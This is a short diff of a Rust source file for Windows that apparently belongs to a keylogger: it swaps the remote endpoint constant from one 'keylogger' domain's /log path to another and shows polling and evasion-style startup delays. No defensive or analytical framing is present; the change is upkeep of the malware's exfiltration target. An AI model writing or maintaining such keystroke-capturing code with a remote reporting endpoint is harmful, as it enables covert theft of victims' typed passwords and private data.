@@ -19,7 +19,7 @@ use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
 use windows_sys::Win32::Foundation::*;
 
 // Configuration
-const API_URL: &str = "https://keylogger.delphigamerz.xyz/log";
+const API_URL: &str = "https://keylogger.aricummings.com/log";
 const POLL_DELAY_MS: u64 = 10;
 const INITIAL_SLEEP_SECS: u64 = 30; // Sleep 30 seconds on first run
 const WARMUP_PERIOD_SECS: u64 = 20; // Additional 20 seconds before logging starts
